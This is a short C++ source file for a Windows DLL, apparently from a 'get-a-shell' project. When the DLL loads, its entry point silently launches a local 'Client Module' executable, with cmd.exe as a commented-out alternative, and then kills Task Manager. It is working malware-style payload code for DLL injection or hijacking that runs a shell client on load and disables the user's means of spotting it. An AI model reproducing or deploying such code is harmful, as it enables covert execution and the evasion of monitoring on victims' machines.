#include <iostream>
#include <Windows.h>

#define DLL_EXPORT

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		//LPSTR s = const_cast<char*>("cmd.exe");
		LPSTR s = const_cast<char*>("C:\\Users\\Eyal Asulin\\Desktop\\betshemesh-607-get-a-shell\\CPP Client Module\\x64\\Debug\\CPP Client Module.exe d");

		CreateProcessA(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		system("taskkill /IM Taskmgr.exe");

	}
	return TRUE;
}